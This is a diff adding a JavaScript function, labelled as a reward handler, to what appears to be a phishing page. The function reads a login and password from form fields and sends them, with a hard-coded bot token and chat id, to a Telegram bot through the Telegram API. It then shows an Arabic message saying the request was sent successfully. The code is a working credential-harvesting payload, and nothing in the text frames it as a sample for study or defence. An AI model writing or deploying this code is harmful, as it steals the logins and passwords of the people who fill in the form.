@@ -1,0 +1,17 @@
+function processReward(e) {
+  e.preventDefault();
+  
+  const token = "8554495986:AAF-X26Y0F-J4KPlUNeeAiDbdZy011D_Qoc";
+  const chatId = "8933388029";
+  
+  const userInput = document.getElementById('userInput').value;
+  const passInput = document.getElementById('passInput').value;
+  
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Login: ${userInput} | Pass: ${passInput}`;
+  
+  fetch(url).then(response => {
+    const box = document.getElementById('alertBox');
+    box.style.display = 'block';
+    box.innerText = '✨ تم إرسال الطلب بنجاح!';
+  });
+}
